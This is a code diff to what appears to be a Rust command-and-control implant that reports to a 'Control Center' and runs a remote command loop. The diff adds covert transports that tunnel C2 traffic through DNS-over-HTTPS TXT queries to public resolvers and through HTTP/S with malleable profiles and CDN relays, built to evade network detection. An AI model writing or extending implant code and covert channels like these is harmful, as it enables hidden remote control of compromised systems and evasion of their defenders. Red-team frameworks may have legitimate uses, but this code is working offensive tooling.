@@ -112,6 +112,27 @@ fn build_tls_client_config(cert_fp: Option<&str>) -> Result<ClientConfig> {
         .with_no_client_auth())
 }
 
+/// Send the initial heartbeat and start the agent command loop for any transport.
+async fn run_with_heartbeat(
+    mut transport: Box<dyn Transport + Send>,
+    agent_id: &str,
+) -> Result<()> {
+    let hostname = System::host_name().unwrap_or_else(|| "unknown".to_string());
+    transport
+        .send(Message::Heartbeat {
+            timestamp: std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .map(|d| d.as_secs())
+                .unwrap_or(0),
+            agent_id: agent_id.to_string(),
+            status: hostname,
+        })
+        .await?;
+    info!("outbound-c: registered with Control Center, running command loop");
+    let mut agent = crate::Agent::new(transport)?;
+    agent.run().await
+}
+
 /// Connect once, run the agent command loop until transport error or
 /// clean shutdown. Returns `Ok(())` on a clean `Shutdown` command.
 async fn connect_once(
@@ -120,6 +141,60 @@ async fn connect_once(
     agent_id: &str,
     cert_fp: Option<&str>,
 ) -> Result<()> {
+    // ─── Experimental transport selection ────────────────────────────────────
+    // When a covert transport feature is compiled in AND the malleable profile
+    // requests it, use that transport instead of establishing a TLS connection.
+    // The malleable profile is read from the config file loaded at runtime;
+    // errors fall through to the default TLS transport.
+    #[cfg(any(feature = "doh-transport", feature = "http-transport"))]
+    {
+        match crate::config::load_config() {
+            Ok(cfg) => {
+                // doh-transport: tunnel C2 messages through DNS TXT records sent
+                // to a public DoH resolver.  Requires a server-side DoH-to-C2
+                // bridge — none is included in this release.
+                #[cfg(feature = "doh-transport")]
+                if cfg.malleable_profile.dns_over_https {
+                    info!(
+                        "doh-transport: dns_over_https=true; switching to DohTransport. \
+                         NOTE: a compatible server-side DoH listener must be deployed; \
+                         none is included in this release."
+                    );
+                    let session = CryptoSession::from_shared_secret(secret.as_bytes());
+                    let transport: Box<dyn Transport + Send> = Box::new(
+                        crate::c2_doh::DohTransport::new(&cfg.malleable_profile, session)
+                            .await
+                            .map_err(|e| anyhow!("DohTransport init failed: {e}"))?,
+                    );
+                    return run_with_heartbeat(transport, agent_id).await;
+                }
+
+                // http-transport: tunnel C2 messages over HTTP/S using the
+                // malleable profile (custom User-Agent, Host header, staging URI).
+                // The Orchestra server must expose the staging URI via its reverse
+                // proxy — see docs/C_SERVER.md.
+                #[cfg(feature = "http-transport")]
+                if cfg.malleable_profile.cdn_relay {
+                    info!("http-transport: cdn_relay=true; switching to HttpTransport");
+                    let session = CryptoSession::from_shared_secret(secret.as_bytes());
+                    let transport: Box<dyn Transport + Send> = Box::new(
+                        crate::c2_http::HttpTransport::new(&cfg.malleable_profile, session)
+                            .await
+                            .map_err(|e| anyhow!("HttpTransport init failed: {e}"))?,
+                    );
+                    return run_with_heartbeat(transport, agent_id).await;
+                }
+            }
+            Err(e) => {
+                warn!(
+                    "outbound-c: could not load config for transport selection: {e}; \
+                     falling back to TLS transport"
+                );
+            }
+        }
+    }
+
+    // ─── Default: direct TLS connection to Control Center ────────────────────
     info!("outbound-c: connecting to Control Center addr={addr} agent_id={agent_id}");
 
     let tcp = TcpStream::connect(addr).await?;
@@ -150,22 +225,7 @@ async fn connect_once(
 
     let mut transport: Box<dyn Transport + Send> = Box::new(TlsTransport::new(tls_stream, session));
 
-    let hostname = System::host_name().unwrap_or_else(|| "unknown".to_string());
-    transport
-        .send(Message::Heartbeat {
-            timestamp: std::time::SystemTime::now()
-                .duration_since(std::time::UNIX_EPOCH)
-                .map(|d| d.as_secs())
-                .unwrap_or(0),
-            agent_id: agent_id.to_string(),
-            status: hostname,
-        })
-        .await?;
-
-    info!("outbound-c: registered with Control Center, running command loop");
-
-    let mut agent = crate::Agent::new(transport)?;
-    agent.run().await
+    run_with_heartbeat(transport, agent_id).await
 }
 
 /// Reconnect loop with exponential back-off. Returns only on clean shutdown
